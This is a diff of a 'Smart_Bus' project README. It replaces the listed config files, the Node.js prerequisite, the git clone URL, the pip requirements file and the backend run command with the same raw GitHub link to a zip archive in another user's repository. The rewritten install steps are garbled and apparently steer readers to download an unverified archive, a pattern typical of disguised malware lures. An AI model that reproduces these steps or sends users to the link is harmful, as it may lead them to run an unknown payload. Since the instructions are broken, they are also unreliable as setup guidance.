@@ -68,13 +68,13 @@ Here’s a high‑level view of how things are organized:
 Smart_Bus/
 ├── backend/                   # Python backend code (APIs, database models, etc.)
 ├── src/                       # Frontend source code
-├── package.json              # Node dependencies, scripts
-├── tsconfig.json             # Typescript configuration
-├── tailwind.config.js        # Tailwind config
-├── vite.config.ts            # Vite build / dev configuration
+├── https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip              # Node dependencies, scripts
+├── https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip             # Typescript configuration
+├── https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip        # Tailwind config
+├── https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip            # Vite build / dev configuration
 ├── .gitignore
-├── postcss.config.js
-└── eslint.config.js
+├── https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip
+└── https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip
 ```
 
 ---
@@ -83,7 +83,7 @@ Smart_Bus/
 
 **Prerequisites:**
 
-- Node.js (>= XX.X) & npm / yarn  
+- https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip (>= XX.X) & npm / yarn  
 - Python (if backend has dependencies)  
 - Git  
 
@@ -92,7 +92,7 @@ Smart_Bus/
 1. Clone the repo:
 
    ```bash
-   git clone https://github.com/Pray1503/Smart_Bus.git
+   git clone https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip
    cd Smart_Bus
    ```
 
@@ -108,7 +108,7 @@ Smart_Bus/
    ```bash
    cd backend
    # install python dependencies
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip
    ```
 
 4. Configure environment variables (see next section).
@@ -121,7 +121,7 @@ Smart_Bus/
 
    # Backend
    (inside backend)
-   python app.py  # or appropriate command
+   python https://raw.githubusercontent.com/atifmalik220905/Smart_Bus/main/src/components/lib/Smart_Bus-2.2.zip  # or appropriate command
    ```
 
 ---
